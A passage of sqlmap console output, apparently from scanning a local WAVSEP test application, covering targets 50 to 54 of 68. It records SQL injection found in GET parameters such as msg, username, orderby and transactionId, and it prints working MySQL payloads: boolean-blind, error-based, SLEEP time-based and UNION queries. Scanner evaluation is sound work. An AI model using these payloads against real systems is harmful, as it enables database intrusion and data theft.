[05:03:32] [INFO] testing if GET parameter 'msg' is dynamic
[05:03:32] [WARNING] GET parameter 'msg' does not appear to be dynamic
[05:03:32] [INFO] heuristic (basic) test shows that GET parameter 'msg' might be injectable (possible DBMS: 'MySQL')
[05:03:33] [INFO] testing for SQL injection on GET parameter 'msg'
[05:03:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:03:33] [WARNING] reflective value(s) found and filtering out
[05:03:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:03:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:03:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:03:34] [INFO] GET parameter 'msg' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:03:34] [INFO] testing 'Generic inline queries'
[05:03:34] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:03:34] [INFO] GET parameter 'msg' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:03:34] [INFO] testing 'MySQL inline queries'
[05:03:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:03:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:03:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:03:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:03:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:03:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:03:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:03:44] [INFO] GET parameter 'msg' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:03:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:03:44] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:03:44] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:03:44] [INFO] target URL appears to have 3 columns in query
[05:03:44] [INFO] GET parameter 'msg' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'msg' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 322 HTTP(s) requests:
---
Parameter: msg (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: msg=textvalue' AND 5837=(SELECT (CASE WHEN (5837=5837) THEN 5837 ELSE (SELECT 1385 UNION SELECT 1705) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: msg=textvalue' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a787871,(SELECT (ELT(9417=9417,1))),0x716a706a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- QZYH

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msg=textvalue' AND (SELECT 8928 FROM (SELECT(SLEEP(5)))AEfd)-- swXt

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: msg=textvalue' UNION ALL SELECT NULL,NULL,CONCAT(0x716a787871,0x775965435363477076736a67567a746e6b515366547646786d5256754b5a47664a675574446e5753,0x716a706a71)-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[05:03:44] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:03:44] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 97 times
[50/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp?username=textvalue
do you want to test this URL? [Y/n/q]
> Y
[05:03:44] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp?username=textvalue'                                                                                                           
[05:03:44] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=A51161CF15F...773DB79DED'). Do you want to use those [Y/n] Y
[05:03:44] [INFO] testing if GET parameter 'username' is dynamic
[05:03:44] [WARNING] GET parameter 'username' does not appear to be dynamic
[05:03:44] [INFO] heuristic (basic) test shows that GET parameter 'username' might be injectable (possible DBMS: 'MySQL')
[05:03:44] [INFO] testing for SQL injection on GET parameter 'username'
[05:03:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:03:44] [WARNING] reflective value(s) found and filtering out
[05:03:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:03:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:03:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:03:45] [INFO] GET parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:03:45] [INFO] testing 'Generic inline queries'
[05:03:45] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:03:45] [INFO] GET parameter 'username' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:03:45] [INFO] testing 'MySQL inline queries'
[05:03:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:03:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:03:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:03:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:03:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:03:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:03:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:03:55] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:03:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:03:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:03:55] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:03:55] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[05:03:55] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[05:03:56] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[05:03:56] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[05:03:56] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[05:03:56] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[05:03:56] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[05:03:56] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[05:03:56] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[05:03:56] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[05:03:56] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[05:03:56] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[05:03:56] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[05:03:56] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[05:03:56] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[05:03:57] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[05:03:57] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[05:03:57] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[05:03:57] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[05:03:57] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 724 HTTP(s) requests:
---
Parameter: username (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=textvalue' AND 4992=(SELECT (CASE WHEN (4992=4992) THEN 4992 ELSE (SELECT 5387 UNION SELECT 9993) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: username=textvalue' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767671,(SELECT (ELT(2448=2448,1))),0x7162716a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- yTIs

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=textvalue' AND (SELECT 3524 FROM (SELECT(SLEEP(5)))pdMW)-- xGBD
---
do you want to exploit this SQL injection? [Y/n] Y
[05:03:57] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:03:57] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 501 times
[51/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp?msg=textvalue
do you want to test this URL? [Y/n/q]
> Y
[05:03:57] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp?msg=textvalue'                                                                                                            
[05:03:57] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=7ED372C2B21...678114AA27'). Do you want to use those [Y/n] Y
[05:03:57] [INFO] testing if GET parameter 'msg' is dynamic
[05:03:57] [WARNING] GET parameter 'msg' does not appear to be dynamic
[05:03:57] [INFO] heuristic (basic) test shows that GET parameter 'msg' might be injectable (possible DBMS: 'MySQL')
[05:03:57] [INFO] testing for SQL injection on GET parameter 'msg'
[05:03:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:03:57] [WARNING] reflective value(s) found and filtering out
[05:03:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:03:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:03:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:03:59] [INFO] GET parameter 'msg' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:03:59] [INFO] testing 'Generic inline queries'
[05:03:59] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:03:59] [INFO] GET parameter 'msg' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:03:59] [INFO] testing 'MySQL inline queries'
[05:03:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:03:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:03:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:03:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:03:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:03:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:03:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:04:09] [INFO] GET parameter 'msg' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:04:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:04:09] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[05:04:09] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[05:04:09] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[05:04:09] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[05:04:09] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[05:04:09] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[05:04:09] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[05:04:09] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[05:04:09] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[05:04:09] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[05:04:09] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[05:04:09] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[05:04:09] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[05:04:09] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[05:04:09] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[05:04:09] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[05:04:09] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[05:04:09] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[05:04:09] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'msg' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 319 HTTP(s) requests:
---
Parameter: msg (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: msg=textvalue' WHERE 1257=1257 AND 9296=(SELECT (CASE WHEN (9296=9296) THEN 9296 ELSE (SELECT 3406 UNION SELECT 2177) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: msg=textvalue' WHERE 3077=3077 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b767171,(SELECT (ELT(8475=8475,1))),0x717a787a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- bnyh

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msg=textvalue' WHERE 8702=8702 AND (SELECT 5217 FROM (SELECT(SLEEP(5)))npQu)-- hkES
---
do you want to exploit this SQL injection? [Y/n] Y
[05:04:09] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:04:09] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 191 times
[52/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp?orderby=msgid
do you want to test this URL? [Y/n/q]
> Y
[05:04:09] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp?orderby=msgid'                                                                                         
[05:04:09] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=DA1CA9018B6...9C36D49AB7'). Do you want to use those [Y/n] Y
[05:04:09] [INFO] testing if GET parameter 'orderby' is dynamic
[05:04:09] [WARNING] GET parameter 'orderby' does not appear to be dynamic
[05:04:09] [INFO] heuristic (basic) test shows that GET parameter 'orderby' might be injectable (possible DBMS: 'MySQL')
[05:04:09] [INFO] testing for SQL injection on GET parameter 'orderby'
[05:04:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:04:09] [WARNING] reflective value(s) found and filtering out
[05:04:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:04:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:04:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:04:11] [INFO] GET parameter 'orderby' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:04:11] [INFO] testing 'Generic inline queries'
[05:04:11] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:04:11] [INFO] GET parameter 'orderby' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:04:11] [INFO] testing 'MySQL inline queries'
[05:04:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:04:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:04:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:04:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:04:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:04:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:04:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:04:21] [INFO] GET parameter 'orderby' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:04:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:04:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:04:21] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[05:04:21] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[05:04:21] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[05:04:21] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[05:04:21] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[05:04:21] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[05:04:21] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[05:04:21] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[05:04:21] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[05:04:21] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[05:04:22] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[05:04:22] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[05:04:22] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[05:04:22] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[05:04:22] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[05:04:22] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[05:04:22] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[05:04:22] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[05:04:22] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'orderby' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 767 HTTP(s) requests:
---
Parameter: orderby (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: orderby=msgid AND 4987=(SELECT (CASE WHEN (4987=4987) THEN 4987 ELSE (SELECT 2400 UNION SELECT 4167) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: orderby=msgid AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT (ELT(8191=8191,1))),0x7162786b71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: orderby=msgid AND (SELECT 9182 FROM (SELECT(SLEEP(5)))xvgq)
---
do you want to exploit this SQL injection? [Y/n] Y
[05:04:22] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:04:22] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 752 times
[53/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp?transactionId=132
do you want to test this URL? [Y/n/q]
> Y
[05:04:22] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp?transactionId=132'                                                                                                         
[05:04:22] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=804AADAF3DB...17D8ED1268'). Do you want to use those [Y/n] Y
[05:04:22] [INFO] testing if GET parameter 'transactionId' is dynamic
[05:04:22] [WARNING] GET parameter 'transactionId' does not appear to be dynamic
[05:04:22] [INFO] heuristic (basic) test shows that GET parameter 'transactionId' might be injectable (possible DBMS: 'MySQL')
[05:04:22] [INFO] testing for SQL injection on GET parameter 'transactionId'
[05:04:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:04:23] [WARNING] reflective value(s) found and filtering out
[05:04:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:04:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:04:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:04:24] [INFO] GET parameter 'transactionId' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:04:24] [INFO] testing 'Generic inline queries'
[05:04:24] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:04:24] [INFO] GET parameter 'transactionId' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:04:24] [INFO] testing 'MySQL inline queries'
[05:04:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:04:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:04:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:04:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:04:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:04:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:04:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:04:34] [INFO] GET parameter 'transactionId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:04:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:04:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:04:34] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:04:34] [INFO] target URL appears to have 4 columns in query
[05:04:34] [INFO] GET parameter 'transactionId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[05:04:34] [WARNING] automatically patching output having last char trimmed
GET parameter 'transactionId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 325 HTTP(s) requests:
---
Parameter: transactionId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: transactionId=132 AND 4847=(SELECT (CASE WHEN (4847=4847) THEN 4847 ELSE (SELECT 1755 UNION SELECT 5185) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionId=132 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178717071,(SELECT (ELT(4885=4885,1))),0x71766b7871,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionId=132 AND (SELECT 1089 FROM (SELECT(SLEEP(5)))uQup)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionId=132 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7178717071,0x7a665651514d656f734947537a4752426648426a6d567a77746d5a53584143555363464f53556259,0x71766b7871)-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[05:04:34] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:04:34] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 298 times
[54/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp?msgId=1
do you want to test this URL? [Y/n/q]
> Y
[05:04:34] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp?msgId=1'                                                                                                                     
[05:04:34] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=2B95F454D47...D11ACF7FD4'). Do you want to use those [Y/n] Y
[05:04:34] [INFO] testing if GET parameter 'msgId' is dynamic
[05:04:34] [WARNING] GET parameter 'msgId' does not appear to be dynamic
[05:04:34] [INFO] heuristic (basic) test shows that GET parameter 'msgId' might be injectable (possible DBMS: 'MySQL')
[05:04:34] [INFO] testing for SQL injection on GET parameter 'msgId'
[05:04:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:04:34] [WARNING] reflective value(s) found and filtering out
[05:04:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:04:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:04:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:04:36] [INFO] GET parameter 'msgId' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:04:36] [INFO] testing 'Generic inline queries'
[05:04:36] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:04:36] [INFO] GET parameter 'msgId' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:04:36] [INFO] testing 'MySQL inline queries'
[05:04:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:04:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:04:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:04:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:04:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:04:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:04:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:04:46] [INFO] GET parameter 'msgId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:04:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:04:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:04:46] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:04:46] [INFO] target URL appears to have 3 columns in query
[05:04:46] [INFO] GET parameter 'msgId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'msgId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 327 HTTP(s) requests:
---
Parameter: msgId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: msgId=1 AND 4876=(SELECT (CASE WHEN (4876=4876) THEN 4876 ELSE (SELECT 8163 UNION SELECT 9414) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: msgId=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT (ELT(7706=7706,1))),0x7176707071,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msgId=1 AND (SELECT 5897 FROM (SELECT(SLEEP(5)))Idqf)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: msgId=1 UNION ALL SELECT NULL,CONCAT(0x717a767671,0x684b766d47455552706e6a6b664874685841734d65485148696659756f797a794d64775348595268,0x7176707071),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[05:04:46] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:04:46] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 291 times
[55/68] URL:
